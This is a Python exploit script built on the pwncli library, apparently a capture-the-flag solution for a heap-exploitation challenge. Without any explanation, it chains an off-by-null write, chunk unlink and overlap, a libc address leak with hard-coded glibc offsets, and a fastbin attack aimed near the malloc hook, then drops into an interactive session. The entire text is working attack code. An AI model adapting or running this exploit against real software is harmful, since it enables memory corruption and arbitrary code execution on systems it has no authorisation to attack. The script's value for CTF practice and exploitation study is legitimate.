from pwncli import *

cli_script()


p = gift['io']

def exec_cmd(*cmd):
    jo = " "
    if isinstance(cmd[0], bytes):
        jo = b" "
    p.sendlineafter("$ ", jo.join(cmd).strip())

# four chunks
exec_cmd("a" * 0x90, "a" * 0x60, "a" * 0xf0, "a" * 0x10)

# off by null
exec_cmd("a" * 0x68)

# clear
for i in range(1, 9):
    exec_cmd("a" * (0x68 - i))

# unlink
exec_cmd("a" * 0x60 + "\x10\x01", "a" * 0xf0)

# # split chunk 0x110 ...
exec_cmd("a" * (0x100 - 1), "a" * 0x30, "a" * 0x30, "a" * 0x30, "a" * 0x30)


# clear and set 0x71
exec_cmd("a" * 0x9f)
for i in range(1, 7):
    exec_cmd("a" * (0x9f - i - 1) + "\x71")


# leak addr
exec_cmd("echo", "a" * (0x60 - 1), "a" * (0x90 - 1))

leak_libc_addr = p.recvuntil(" a")[:-2]
leak_libc_addr = u64(leak_libc_addr.ljust(8, b"\x00"))
log_address("leak_libc_addr", leak_libc_addr)

libc_base_addr = leak_libc_addr - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)

exec_cmd("a" * 0xa7)
exec_cmd("a" * 0xa6)

target = libc_base_addr + 0x3c4b10 - 0x23
exec_cmd(b"a"*0xa0+p64(target)[:-2])

# fastbin attack
exec_cmd("a" * 0x9f)
for i in range(1, 7):
    exec_cmd("a" * (0x9f - i - 1) + "\x71")

exec_cmd("monitor", "a" * 0x60, "a"*0x13 + "monitora" + "a" * 0x45)

p.interactive()